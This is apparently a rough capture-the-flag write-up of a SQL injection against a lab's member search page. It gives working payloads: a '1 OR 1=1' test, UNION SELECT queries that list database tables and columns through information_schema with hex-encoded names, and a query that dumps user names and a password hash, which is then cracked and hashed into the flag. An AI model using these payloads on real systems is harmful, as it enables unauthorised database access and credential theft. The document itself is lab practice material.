# SQL Injection Vulnerability in member search :


### Step 1: Initial Vulnerability Testing
Input in the id parameter:
```sql
1 OR 1=1
```

Results:
```
ID: 1 or 1=1  
First name: one
Surname: me

ID: 1 or 1=1  
First name: two
Surname: me

ID: 1 or 1=1  
First name: three
Surname: me

ID: 1 or 1=1  
First name: Flag
Surname: GetThe



```
2- list all tables
### 1 UNION SELECT table_name, null FROM information_schema.tables

3 - list all user table columns 
### 1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x7573657273--
c
### 1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 0x696D61676573 --
4 - 
#### 1 UNION SELECT first_name, countersign FROM users--

l9aaw 5ff9d0165b4f92b14994e5c685cdce28 = FortyTwo

5 -  1 UNION SELECT first_name, Commentaire FROM users--

"Decrypt this password -> then lower all the char. Sh256 on it and it's good !"


list all cloumns 1 UNION SELECT column_name, null FROM information_schema.columns--



fortytwo ->  10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5


